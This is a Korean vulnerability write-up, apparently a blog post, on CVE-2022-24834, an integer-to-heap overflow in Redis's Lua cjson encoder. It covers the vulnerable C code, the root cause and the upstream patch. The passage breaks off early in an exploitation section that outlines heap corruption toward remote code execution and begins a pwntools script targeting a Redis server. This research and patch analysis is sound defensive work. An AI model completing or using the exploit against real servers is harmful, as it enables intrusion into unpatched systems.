&#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC778; Redis&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xC758; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD305;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; Redis&#xC5D0;&#xC11C; &#xACF5;&#xD1B5;&#xC801;&#xC73C;&#xB85C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xBA70; Lua&#xC5D0;&#xC11C; JSON &#xC778;&#xCF54;&#xB529; &#xBC0F; &#xD30C;&#xC2F1;&#xC744; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBAA8;&#xB4C8;&#xC778; cjson&#xC5D0;&#xC11C; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD55C; &#xAC83;&#xC774; &#xC6D0;&#xC778;&#xC774;&#xACE0; Redis Server&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xACE0; Lua Script&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBC84;&#xADF8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; Integer Overflow&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Heap Overflow&#xB85C; Remote Code Execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. </p><h2 id="Affected-Product-amp-Version-Information"><a href="#Affected-Product-amp-Version-Information" class="headerlink" title="Affected Product &amp; Version Information"></a>Affected Product &amp; Version Information</h2><ul><li>Redis<ul><li>7.0.0 &#x2264; version &lt; 7.0.12</li><li>6.2.0 &#x2264; version &lt; 6.2.13</li><li>2.6.0 &#x2264; version &lt; 6.0.20</li></ul></li></ul><h1 id="2-&#xCDE8;&#xC57D;&#xC810;-&#xBD84;&#xC11D;"><a href="#2-&#xCDE8;&#xC57D;&#xC810;-&#xBD84;&#xC11D;" class="headerlink" title="2. &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;"></a>2. &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;</h1><hr><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; Redis&#xC758; Lua&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBAA8;&#xB4C8;&#xC778; cjson&#xC758; <code>json_append_string</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70; &#xBAA8;&#xB4E0; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xB3D9;&#xC77C;&#xD55C; Root cause&#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h2 id="json-append-string"><a href="#json-append-string" class="headerlink" title="json_append_string"></a><code>json_append_string</code></h2><p>&#xC774; &#xD568;&#xC218;&#xC758; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">/* json_append_string args:</span><span class="hljs-comment"> * - lua_State</span><span class="hljs-comment"> * - JSON strbuf</span><span class="hljs-comment"> * - String (Lua stack index)</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Returns nothing. Doesn&apos;t remove string from Lua stack */</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">json_append_string</span><span class="hljs-params">(lua_State *l, <span class="hljs-keyword">strbuf_t</span> *json, <span class="hljs-keyword">int</span> lindex)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *escstr;    <span class="hljs-keyword">int</span> i;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *str;    <span class="hljs-keyword">size_t</span> len;    str = lua_tolstring(l, lindex, &amp;len);<span class="hljs-comment">// [1]</span>    <span class="hljs-comment">/* Worst case is len * 6 (all unicode escapes).</span><span class="hljs-comment">     * This buffer is reused constantly for small strings</span><span class="hljs-comment">     * If there are any excess pages, they won&apos;t be hit anyway.</span><span class="hljs-comment">     * This gains ~5% speedup. */</span>    strbuf_ensure_empty_length(json, len * <span class="hljs-number">6</span> + <span class="hljs-number">2</span>);    <span class="hljs-comment">// [2]</span>    strbuf_append_char_unsafe(json, &apos;\\&quot;&apos;);     // [3]    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) {        escstr = char2escape[(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)str[i]];        <span class="hljs-keyword">if</span> (escstr)            strbuf_append_string(json, escstr);        <span class="hljs-keyword">else</span>            strbuf_append_char_unsafe(json, str[i]);    }    strbuf_append_char_unsafe(json, &apos;\\&quot;&apos;);}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC694; &#xAE30;&#xB2A5;&#xC740; Lua&#xC758; &#xBB38;&#xC790;&#xC5F4; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; JSON &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB97C; &#xD06C;&#xAC8C; <code>[1]</code>, <code>[2]</code>, <code>[3]</code>&#xC758; &#xC138; &#xB2E8;&#xACC4;&#xB85C; &#xB098;&#xB204;&#xC5B4; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-Lua-String-&#x2192;-C-String"><a href="#1-Lua-String-&#x2192;-C-String" class="headerlink" title="1. Lua String &#x2192; C String"></a>1. Lua String &#x2192; C String</h3><pre><code class="hljs c">str = lua_tolstring(l, lindex, &amp;len);<span class="hljs-comment">// [1]</span></code></pre><p>&#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790; <code>lua_State *l</code>&#xACFC; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; <code>int lindex</code>&#xB97C; &#xC778;&#xC790;&#xB85C; <code>lua_tolstring</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xC774;&#xB294; &#xC778;&#xCF54;&#xB529;&#xD560; Lua &#xBB38;&#xC790;&#xC5F4;&#xC744; C &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xC5EC; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. C &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xAE38;&#xC774;&#xB294; &#xC138; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; <code>size_t len</code>&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="2-strbuf-ensure-empty-length"><a href="#2-strbuf-ensure-empty-length" class="headerlink" title="2. strbuf_ensure_empty_length"></a>2. <code>strbuf_ensure_empty_length</code></h3><pre><code class="hljs c">strbuf_ensure_empty_length(json, len * <span class="hljs-number">6</span> + <span class="hljs-number">2</span>);    <span class="hljs-comment">// [2]</span></code></pre><p>&#xC778;&#xCF54;&#xB529;&#xB41C; JSON &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC800;&#xC7A5;&#xB420; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xB3D9;&#xC791;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xACB0;&#xACFC;, <code>len * 6 + 2</code> &#xD06C;&#xAE30;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB294; &#xC778;&#xCF54;&#xB529; &#xACFC;&#xC815;&#xC5D0;&#xC11C; 1&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xBB38;&#xC790;&#xAC00; Unicode Escape&#xB418;&#xBA74; <code>\uXXXX</code>&#xD615;&#xD0DC;&#xC758; &#xCD1D; 6&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC73C;&#xB85C; &#xB9CC;&#xC57D; &#xC778;&#xCF54;&#xB529;&#xD560; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xBAA8;&#xB4E0; &#xBB38;&#xC790;&#xAC00; escape&#xB420; &#xACBD;&#xC6B0; &#xC6D0;&#xB798; &#xAE38;&#xC774;&#xC758; &#xC5EC;&#xC12F; &#xBC30;&#xAC00; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; 2&#xB97C; &#xB354;&#xD558;&#xB294; &#xC774;&#xC720;&#xB294; JSON &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xB9E8; &#xC55E;&#xACFC; &#xB05D;&#xC5D0; &#xCD94;&#xAC00;&#xD560; &#xB450; &#xAC1C;&#xC758; &#xC30D;&#xB530;&#xC634;&#xD45C;&#xB85C; &#xC778;&#xD574; &#xCD94;&#xAC00;&#xC801;&#xC778; 2&#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p><code>strbuf_ensure_empty_length</code>&#xD568;&#xC218;&#xC758; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>strbuf_empty_length</code>&#xB85C; &#xBC18;&#xD658;&#xB41C; &#xBC84;&#xD37C;&#xC758; &#xB0A8;&#xC740; &#xACF5;&#xAC04;&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xC694;&#xCCAD;&#xB41C; &#xAE38;&#xC774;&#xBCF4;&#xB2E4; &#xC791;&#xC73C;&#xBA74; <code>strbuf_resize</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xC774; &#xD568;&#xC218;&#xC758; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB294; <code>realloc</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">strbuf_ensure_empty_length</span><span class="hljs-params">(<span class="hljs-keyword">strbuf_t</span> *s, <span class="hljs-keyword">int</span> len)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> (len &gt; strbuf_empty_length(s))        strbuf_resize(s, s-&gt;length + len);}</code></pre><h3 id="3-Unicode-Escape"><a href="#3-Unicode-Escape" class="headerlink" title="3. Unicode Escape"></a>3. Unicode Escape</h3><pre><code class="hljs c">strbuf_append_char_unsafe(json, &apos;\\&quot;&apos;);     // [3]<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) {    escstr = char2escape[(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)str[i]];    <span class="hljs-keyword">if</span> (escstr)        strbuf_append_string(json, escstr);    <span class="hljs-keyword">else</span>        strbuf_append_char_unsafe(json, str[i]);}strbuf_append_char_unsafe(json, &apos;\\&quot;&apos;);</code></pre><p><code>for</code> &#xBC18;&#xBCF5;&#xBB38;&#xC758; &#xC55E;&#xACFC; &#xB4A4;&#xC5D0;&#xC11C; &#xC30D;&#xB530;&#xC634;&#xD45C;&#xB97C; &#xD558;&#xB098;&#xC529; &#xCD94;&#xAC00;&#xD558;&#xACE0; &#xBC18;&#xBCF5;&#xBB38; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; <code>[2]</code> &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC4F0;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. escape&#xB418;&#xB294; &#xBB38;&#xC790;&#xC758; &#xACBD;&#xC6B0;, <code>strbuf_append_string</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; escape&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xACE0; escape&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xBB38;&#xC790;&#xB294; <code>strbuf_append_char_unsafe</code>&#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB2E8;&#xC21C;&#xD788; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. <code>char *char2escape[256]</code>&#xC740; &#xBAA8;&#xB4E0; &#xC544;&#xC2A4;&#xD0A4; &#xBB38;&#xC790;&#xC5D0; &#xB300;&#xD55C; Unicode escape&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xB85C; escape&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xBB38;&#xC790;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; NULL&#xC744; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>&#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC740; Integer Overflow&#xB85C; <code>[2]</code> &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; <code>strbuf_ensure_empty_length</code>&#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xD55C; <code>size_t</code> &#xC790;&#xB8CC;&#xD615;&#xC778; <code>len * 6 + 2</code>&#xAC00; <code>int</code> &#xC790;&#xB8CC;&#xD615;&#xC73C;&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xB41C; &#xAC83;&#xC774; &#xC6D0;&#xC778;&#xC785;&#xB2C8;&#xB2E4;. </p><p><code>size_t</code> &#xC790;&#xB8CC;&#xD615;&#xC778; <code>json_append_string</code>&#xD568;&#xC218;&#xC758; <code>len * 6 + 2</code>&#xAC00; <code>strbuf_ensure_empty_length</code>&#xC758; <code>int len</code>&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xBA74;&#xC11C; 64&#xBE44;&#xD2B8; &#xD06C;&#xAE30;&#xC778; <code>size_t</code>&#xC5D0;&#xC11C; 32&#xBE44;&#xD2B8; &#xD06C;&#xAE30;&#xC778; <code>int</code>&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC5F0;&#xC0B0; &#xACB0;&#xACFC;&#xC758; &#xC0C1;&#xC704; 32&#xBE44;&#xD2B8;&#xB294; &#xC0AC;&#xB77C;&#xC9C0;&#xAC8C; &#xB418;&#xACE0; &#xB9CC;&#xC57D; <code>len * 6 + 2</code>&#xAC00; 32&#xBE44;&#xD2B8;&#xB85C; &#xC804;&#xBD80; &#xD45C;&#xD604;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xAC12;&#xC774;&#xB77C;&#xBA74; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xC758;&#xB3C4;&#xD55C; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xBC84;&#xD37C;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p> &#xC774;&#xB85C; &#xC778;&#xD574; <code>[3]</code> &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBC84;&#xD37C;&#xC5D0; &#xC4F8; &#xB54C; Heap Overflow&#xAE4C;&#xC9C0; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="3-&#xD328;&#xCE58;-&#xBD84;&#xC11D;"><a href="#3-&#xD328;&#xCE58;-&#xBD84;&#xC11D;" class="headerlink" title="3. &#xD328;&#xCE58; &#xBD84;&#xC11D;"></a>3. &#xD328;&#xCE58; &#xBD84;&#xC11D;</h1><hr><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC55E;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; &#xD328;&#xCE58;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Redis &#xBC84;&#xC804; <a href="https://github.com/redis/redis/pull/12401/commits/5c5441d16682803ebf8de9ebd8d438517aef9d89">7.0.12</a>, <a href="https://github.com/redis/redis/pull/12400/commits/e47c1f5f7bc150b0c1774b65bc2dba7e116da4f0#diff-dd930db7f554182383e7581313c58c5a4fe4ee88dbd9b448f056f070bbb62336">6.2.13</a>, <a href="https://github.com/redis/redis/pull/12399/commits/8e97274dd5be535033e7f31cd0cd99cf37e1cb0b">6.0.20</a> &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC624;&#xD508;&#xC18C;&#xC2A4;&#xB77C; &#xADF8;&#xB7F0;&#xC9C0; &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;&#xB3C4; &#xADF8;&#xB807;&#xACE0; &#xC5EC;&#xB7EC;&#xBAA8;&#xB85C; &#xD3B8;&#xB9AC;&#xD558;&#xB124;&#xC694;.</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/image.png" alt="image.png"></p><blockquote><p><del>&#xC0AC;&#xC2E4; IDA&#xB85C; &#xBCF4;&#xB294;&#xAC8C; &#xB354; &#xC7AC;&#xBC0C;&#xC74C;</del></p></blockquote><h2 id="json-append-string-Patched"><a href="#json-append-string-Patched" class="headerlink" title="json_append_string : Patched"></a><code>json_append_string</code> : Patched</h2><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">json_append_string</span><span class="hljs-params">(lua_State *l, <span class="hljs-keyword">strbuf_t</span> *json, <span class="hljs-keyword">int</span> lindex)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *escstr;    <span class="hljs-keyword">int</span> i;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *str;    <span class="hljs-keyword">size_t</span> len;    str = lua_tolstring(l, lindex, &amp;len);    <span class="hljs-comment">/* Worst case is len * 6 (all unicode escapes).</span><span class="hljs-comment">     * This buffer is reused constantly for small strings</span><span class="hljs-comment">     * If there are any excess pages, they won&apos;t be hit anyway.</span><span class="hljs-comment">     * This gains ~5% speedup. */</span>    <span class="hljs-keyword">if</span> (len &gt; SIZE_MAX / <span class="hljs-number">6</span> - <span class="hljs-number">3</span>) <span class="hljs-comment">// [1]</span>        <span class="hljs-built_in">abort</span>(); <span class="hljs-comment">/* Overflow check */</span>    strbuf_ensure_empty_length(json, len * <span class="hljs-number">6</span> + <span class="hljs-number">2</span>);    strbuf_append_char_unsafe(json, <span class="hljs-string">&apos;\&quot;&apos;</span>);    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) {        escstr = char2escape[(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)str[i]];        <span class="hljs-keyword">if</span> (escstr)            strbuf_append_string(json, escstr);        <span class="hljs-keyword">else</span>            strbuf_append_char_unsafe(json, str[i]);    }    strbuf_append_char_unsafe(json, <span class="hljs-string">&apos;\&quot;&apos;</span>);}</code></pre><p><code>json_append_string</code> &#xD568;&#xC218;&#xB294; <code>[1]</code>&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xB41C; &#xBD80;&#xBD84;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC5D0; &#xB530;&#xB77C; 64&#xBE44;&#xD2B8;&#xB098; 32&#xBE44;&#xD2B8;&#xC758; unsigned integer&#xC758; &#xCD5C;&#xB313;&#xAC12;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xB418;&#xB294; <code>SIZE_MAX</code>&#xB97C; 6&#xC73C;&#xB85C; &#xB098;&#xB204;&#xACE0; 3&#xC744; &#xBE80; &#xAC12;&#xACFC; <code>len</code>&#xC744; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;.</p><p> &#xB9CC;&#xC57D; <code>len</code>&#xC774; &#xB354; &#xD06C;&#xB2E4;&#xBA74; <code>strbuf_ensure_empty_length</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xC704;&#xD574; <code>len * 6 + 2</code>&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>abort()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="strbuf-ensure-empty-length-Patched"><a href="#strbuf-ensure-empty-length-Patched" class="headerlink" title="strbuf_ensure_empty_length : Patched"></a><code>strbuf_ensure_empty_length</code> : Patched</h2><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">strbuf_ensure_empty_length</span><span class="hljs-params">(<span class="hljs-keyword">strbuf_t</span> *s, <span class="hljs-keyword">size_t</span> len)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> (len &gt; strbuf_empty_length(s))        strbuf_resize(s, s-&gt;length + len);}</code></pre><p><code>strbuf_ensure_empty_length</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; <code>len</code>&#xC758; &#xC790;&#xB8CC;&#xD615;&#xC774; <code>int</code>&#xC5D0;&#xC11C; <code>size_t</code>&#xB85C; &#xBCC0;&#xACBD;&#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAE30;&#xC874;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C;&#xB294; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB418;&#xC5C8;&#xACE0; <code>strbuf_empty_length</code> &#xB610;&#xD55C; <code>size_t</code>&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xD328;&#xCE58; &#xC774;&#xD6C4; Integer Overflow&#xB97C; &#xC720;&#xBC1C;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; 64&#xBE44;&#xD2B8;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xAE38;&#xC774;&#xAC00; &#xB300;&#xB7B5; 0x2AAAAAAAAAAAAAAB&#xC778; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC804;&#xB2EC;&#xD574;&#xC57C; &#xD558;&#xACE0; &#xC774;&#xB294; &#xC2E4;&#xC6A9;&#xC801;&#xC774;&#xC9C0; &#xBABB;&#xD558;&#xBA70; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB354;&#xB77C;&#xB3C4; <code>json_append_string</code>&#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD0D0;&#xC9C0;&#xB418;&#xC5B4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xC720;&#xC0AC;&#xD558;&#xAC70;&#xB098; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xB294; &#xBD80;&#xBD84;&#xC5D0; Integer Overflow&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xAC70;&#xB098; <code>int</code> &#xC790;&#xB8CC;&#xD615;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB358; &#xBD80;&#xBD84;&#xC774; <code>size_t</code> &#xB098; &#xB2E4;&#xB978; 64&#xBE44;&#xD2B8; &#xC815;&#xC218; &#xC790;&#xB8CC;&#xD615;&#xC73C;&#xB85C; &#xB300;&#xCCB4;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="4-Exploitation"><a href="#4-Exploitation" class="headerlink" title="4. Exploitation"></a>4. Exploitation</h1><hr><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; Heap Corruption&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xCF1C; Denial of Service&#xB098; &#xD799;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; Lua Object&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xACE0; Fake Object&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xC5EC; Remote Code Execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; Redis Server&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xACE0; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC804;&#xC1A1;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; python&#xCF54;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># redis_cve-2022-24834.py</span><span class="hljs-keyword">import</span> pwn<span class="hljs-keyword">import</span> threading<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> syspwn.context.log_level = <span class="hljs-string">&quot;debug&quot;</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Redis</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, host=<span class="hljs-string">&apos;192.168.45.250&apos;</span>, port=<span class="hljs-number">6379</span></span>):</span>        self.host = host        self.port = port        self.conn = <span class="hljs-literal">None</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prepare</span>(<span class="hljs-params">self, data</span>):</span>        <span class="hljs-keyword">if</span> isinstance(data, int):            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;:<span class="hljs-subst">{data}</span>\r\n&quot;</span>.encode()        